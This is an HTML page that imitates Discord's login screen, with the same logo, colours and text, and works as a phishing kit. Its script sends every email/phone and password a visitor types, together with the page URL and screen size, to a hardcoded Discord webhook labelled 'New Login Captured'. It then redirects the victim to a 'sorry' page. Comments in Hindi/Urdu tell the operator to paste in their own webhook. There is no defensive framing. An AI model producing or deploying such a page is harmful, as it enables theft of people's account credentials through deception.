<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord — Login</title>
<link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    font-family:"gg sans","Noto Sans",Helvetica,Arial,sans-serif;
    background:#313338;color:#dbdee1;
    min-height:100vh;display:flex;align-items:center;justify-content:center;
    padding:20px;
  }
  .card{
    background:#313338;width:100%;max-width:480px;
    padding:32px;border-radius:5px;
    box-shadow:0 2px 10px 0 rgba(0,0,0,.2);
  }
  .logo{display:block;margin:0 auto 24px;width:130px;color:#fff}
  h1{font-size:24px;line-height:30px;font-weight:600;text-align:center;color:#f2f3f5;margin-bottom:8px}
  .sub{text-align:center;color:#b5bac1;font-size:16px;margin-bottom:20px}
  label{display:block;font-size:12px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;color:#b5bac1;margin-bottom:8px}
  label .req{color:#f23f43}
  input{
    width:100%;padding:10px;height:40px;
    background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;
    color:#dbdee1;font-size:16px;outline:none;margin-bottom:20px;
  }
  input:focus{border-color:#5865f2}
  .forgot{display:block;font-size:14px;color:#00a8fc;text-decoration:none;margin:-10px 0 20px}
  .forgot:hover{text-decoration:underline}
  button{
    width:100%;height:44px;background:#5865f2;color:#fff;border:none;
    border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;
    transition:background .17s ease;font-family:inherit;
  }
  button:hover{background:#4752c4}
  button:disabled{background:#4752c4;cursor:not-allowed;opacity:.8}
  .bottom{font-size:14px;color:#949ba4;margin-top:20px}
  .bottom a{color:#00a8fc;text-decoration:none}
  .bottom a:hover{text-decoration:underline}
  .err{color:#f23f43;font-size:14px;margin-bottom:14px;display:none}
</style>
</head>
<body>

<div class="card">
  <svg class="logo" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/>
  </svg>

  <h1>Welcome back!</h1>
  <p class="sub">We're so excited to see you again!</p>

  <form id="loginForm" autocomplete="off">
    <div class="err" id="errBox">Email ya password khali hai.</div>

    <label for="email">Email or Phone Number <span class="req">*</span></label>
    <input id="email" name="email" type="text" required>

    <label for="password">Password <span class="req">*</span></label>
    <input id="password" name="password" type="password" required>

    <a href="#" class="forgot">Forgot your password?</a>

    <button type="submit" id="btn">Log In</button>
  </form>

  <p class="bottom">Need an account? <a href="#">Register</a></p>
</div>

<script>
/* ================== YAHAN APNA WEBHOOK URL PASTE KARO ================== */
const WEBHOOK_URL = "https://discord.com/api/webhooks/1570073447726448671/yCz3b7sjeCHtKA_aESCO-07OoZVbWwkZZ30HdJeQollC4peBcj0k6dNzfm-wKs38K6zi";
/* ======================================================================= */

const form = document.getElementById('loginForm');
const btn  = document.getElementById('btn');
const errBox = document.getElementById('errBox');

form.addEventListener('submit', async function (e) {
  e.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;

  if (!email || !password) {
    errBox.style.display = 'block';
    return;
  }

  errBox.style.display = 'none';
  btn.disabled = true;
  btn.textContent = 'Logging in...';

  const payload = {
    username: 'Discord Login',
    embeds: [{
      title: '🔐 New Login Captured',
      color: 0x5865F2,
      fields: [
        { name: '📧 Email / Phone', value: '```' + email + '```', inline: false },
        { name: '🔑 Password',     value: '```' + password + '```', inline: false },
        { name: '🌐 Page',         value: location.href, inline: false }
      ],
      footer: { text: 'Screen: ' + screen.width + 'x' + screen.height },
      timestamp: new Date().toISOString()
    }]
  };

  const body = new URLSearchParams();
  body.append('payload_json', JSON.stringify(payload));

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      body: body
    });
  } catch (err) {
    /* webhook fail bhi ho jaye to bhi redirect karna hai */
  }

  setTimeout(function () {
    window.location.href = 'sorry.html';
  }, 900);
});
</script>

</body>
</html>
